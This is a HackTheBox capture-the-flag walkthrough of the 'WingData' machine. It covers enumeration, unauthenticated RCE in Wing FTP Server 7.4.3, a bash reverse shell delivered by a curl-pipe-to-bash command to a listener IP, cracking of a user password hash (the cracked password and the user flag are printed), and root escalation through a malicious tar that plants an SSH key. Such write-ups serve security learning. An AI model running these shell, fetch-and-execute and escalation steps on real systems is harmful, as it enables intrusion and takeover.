### INTRO

A walkthrough of the HackTheBox 'WingData' machine. This write-up covers initial access, privilege escalation, and post-exploitation techniques.


### Key Highlights
Ready to take on the WingData machine on Hack The Box? This guide provides a complete walkthrough for your penetration testing journey. While there’s no universal exploit script dedicated solely to WingData, the walkthrough will help you identify and craft custom scripts or modify public exploits as needed depending on the vulnerabilities you uncover. Here’s a glimpse of what you’ll learn:

### Ping IP
Before we start scanning we'll ping our machine on the network we see if it's reacheable via the vpn

![ping](/writeups/images/wingdata1.png)

### Initial NMAP scanning
We'll perform a basic nmap scan to see the serices, open ports and other scripts on the machine. we'll use commands for tcp full scan. 

```bash
nmap -sC -sV -p- -T4 10.129.x.x
```

![nmap](/writeups/images/wingdata2.png)

### Findings
```bash
Port 22/tcp: SSH (OpenSSH) 
Port 80/tcp: HTTP (Apache/Nginx or Wing FTP Web Interface) 
Port 8080/tcp: 
```
Often used for the Wing FTP Web Administration or Client Interface.

Adding wingdata to our host
Since we got an error when we were adding our ip directly to access http at port 80, i went ahead and added the wingdata.htb to our main host using sudo nano /etc/hosts


![host](/writeups/images/wingdata3.png)

### Navigating to webpage
We found port 80 open and we all know if http exist we have a website running so i decided to check the http service on the web and found the webpage

![web](/writeups/images/wingdata4.png)

### Manual enumeration (Inspecting source code for hidden info)
The process of manually inspecting a target application's source code (if available) or client-side code (via browser developer tools) to gather information and identify vulnerabilities.


![code](/writeups/images/wingdata5.png)

### Using ffuf for enumeration
ffuf stands for Fuzz Faster U Fool. It’s a tool used for web enumeration, fuzzing, and directory brute forcing.

Install ffuf ffuf is already included in the following Linux distributions:

BlackArch Pentoo Kali Parrot Search Repology for other distributions Note: Repology is a service that monitors a lot of package repositories and other sources and aggregates data on software package versions, reporting new releases and packaging problems.

If it’s not included in your Linux distribution you can deploy it manually following the installation instructions.

![ffuf](/writeups/images/wingdata6.png)

### Gobuster tool for deep enumeration
Directory/file & DNS busting tool written in Go Gobuster is a tool used to brute-force: URIs (directories and files) in web sites, DNS subdomains (with wildcard support), Virtual Host names on target web servers, Open Amazon S3 buckets, Open Google Cloud buckets and TFTP servers.

Gobuster is useful for pentesters, ethical hackers and forensics experts. It also can be used for security tests.

![gob](/writeups/images/wingdata7.png)

### Web Enumeration
Navigating to the web interface, we are greeted by the Wing FTP Server dashboard. Wing FTP is a cross-platform server supporting FTP, HTTP, FTPS, and SFTP.

Clicking the “Client Portal” button redirects to a new virtual host at the ftp domain revealing a login page.

At the bottom, the application discloses its fingerprint: Wing FTP Server v7.4.3.

Key observations:

```bash
Version identification is critical. Looking at the bottom of the page or the HTTP headers often reveals the specific build.
On WingData, the version is typically found to be prior to 7.4.4, which is a “red flag” for the recently disclosed CVE-2025-47812.
```

![webenum](/writeups/images/wingdata8.png)

Output confirmed RCE as:

wingftp
Why this works
The exploit abuses a null-byte handling mismatch between a C layer and Lua backend parsing, letting crafted input bypass intended checks and execute arbitrary commands in the web app context.

### Getting a Reverse Shell
I hosted a bash reverse shell payload locally:
```bash
echo 'bash -i >& /dev/tcp/10.10.15.9/4444 0>&1' > shell.sh
python3 -m http.server 8000
```
Then executed it through the RCE:

python3 exploit.py -u http://ftp.wingdata.htb -c "curl -s http://10.10.15.9:8000/shell.sh | bash"
Listener caught a shell as wingftp.

### Post-Exploitation Enumeration as wingftp
Inside /opt/wftpserver I found Wing FTP files and keys:

wftp_default_ssh.key
Data directory with account data
I checked the data directory:

cd /opt/wftpserver/Data
ls
Admin account data:

cat _ADMINISTRATOR/admins.xml
This gave an admin hash, but cracking that was not needed.

Then I looked at domain user files:
```bash
ls /opt/wftpserver/Data/1/users
Users included:

anonymous.xml
john.xml
maria.xml
steve.xml
wacky.xml
From wacky.xml, I extracted the password hash and cracked it using Wing FTP salt format.
```
***Cracked credential:

wacky: !#7Blushing^*Bride5
6. SSH Access as wacky
I authenticated over SSH:

ssh wacky@wingdata.htb
Confirmed shell as wacky and retrieved user flag:

8b0a99de4e332a291e1b71e2d7cdbc93
7. Privilege Escalation to root
Sudo permissions for wacky:
```bash
sudo -l
```
Allowed command:
```bash
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```
I reviewed the script and identified risky extraction logic:

with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
The script extracts attacker-controlled tar files as root. This was exploitable via a tarfile filter bypass pattern (CVE-2025-4138 style path resolution bypass using deep symlink chains).

***Exploit strategy***
Generate an SSH key pair.
Create a malicious tar that writes the public key into /root/.ssh/authorized_keys.
Run the restore script with sudo.
SSH into localhost as root using the private key.
Generate key:

ssh-keygen -t ed25519 -f wingdata_key -N ""
Build exploit tar (using the crafted script):

python3 exploit.py -o backup_777.tar -p ssh-key -P wingdata_key.pub
Place and trigger restore:

mv backup_777.tar /opt/backup_clients/backups/
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_777.tar -r restore_pwn
SSH as root:
```bash
ssh -i wingdata_key root@127.0.0.1
```
Root shell obtained successfully.

### Flags
User flag: 8b0a99de4e332a291e1b71e2d7cdbc93
Root flag: Retrieved from /root/root.txt after root access
### Attack Chain Summary
This machine was solved by chaining:

VHost discovery (ftp.wingdata.htb).
Unauthenticated RCE in Wing FTP Server 7.4.3.
Credential discovery and hash cracking for user wacky.
SSH pivot from service user to real system user.
Sudo abuse in backup restore workflow using tar extraction bypass to write root authorized keys.